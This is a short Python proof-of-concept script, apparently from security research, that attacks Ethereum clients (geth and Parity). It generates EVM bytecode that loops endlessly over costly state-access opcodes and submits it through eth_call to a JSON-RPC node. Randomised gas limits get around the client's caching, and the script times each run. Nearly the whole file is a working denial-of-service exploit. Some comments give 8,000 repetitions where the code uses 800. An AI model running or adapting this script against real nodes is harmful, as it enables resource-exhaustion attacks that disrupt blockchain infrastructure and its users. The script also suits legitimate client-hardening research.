#!/usr/bin/python3

import requests
import time
import random

def saeiso_attack(parity=False, opcode="31"):
    """
    This will try to execute as many different opcode operations as possible and measure the execution time

    We will use an infinite loop containing BALANCE operations

    Args:
        parity: (bool) Run against parity instead of geth
        opcode: (string) Opcode to use for the attack.
                31: BALANCE, 3B: EXTCODESIZE, 3F: EXTCODEHASH, FA: STATICCALL

    Returns: (double) time spent in transaction
    """
    # Repeat code 10 times in case of parity (to keep cost of calldata low) and 8000 times for geth to create a big contract
    code_repitions = 10 if parity else 800

    # Special case STATICCALL
    if opcode == "FA":
        code = "5b%s600056" % (("60008080805a5a%s50"%opcode) * code_repitions)  # JUMPDEST (PUSH 0 DUP1 DUP1 DUP1 GAS GAS STATICCALL POP) * 8'000 PUSH1 0x0 JUMP
    else:
        code = "5b%s600056" % (("5a%s50"%opcode) * code_repitions)  # JUMPDEST (GAS BALANCE/EXTCODESIZE/EXTCODEHASH POP) * 8'000 PUSH1 0x0 JUMP
    geth_params = [
        {
            "gas":hex(random.randint(39980000,40000000)),  # providing random gas limit between (x-0.2)m and x m - geth is aggressively caching already queried balances
            "to":"0x5a31505a31505a31505a31505a31505a31505a31"  # this address is called with the code provided below
        },
        "latest",
        {
            "0x5a31505a31505a31505a31505a31505a31505a31": {
                "code": "0x%s" % code
            }
        }
    ]
    parity_params = [
        {
            "gas": hex(random.randint(9800000,10000000)),  # providing random gas
            "from": "0x5a31505a31505a31505a31505a31505a31505a31",
            "data": "0x%s" % code
        }
    ]

    # print("code %s" % code)

    start = time.time()
    r = requests.post("http://localhost:8545", json={
        "method": "eth_call",
        "params": parity_params if parity else geth_params, "id": 1, "jsonrpc": "2.0"
    })
    duration = time.time() - start
    print("Transaction executed in %s seconds" % duration)
    # print(r.text)
    # print("code_repitions %d " % code_repitions)
    # print("params %s " % geth_params)
    return duration

def main():
    print("Analyzing BALANCE")
    saeiso_attack(False,"31")
    print("Analyzing EXTCODESIZE")
    saeiso_attack(False,"3B")
    print("Analyzing EXTCODEHASH")
    saeiso_attack(False,"3F")
    print("Analyzing STATICCALL")
    saeiso_attack(False,"FA")

if __name__ == '__main__':
    main()
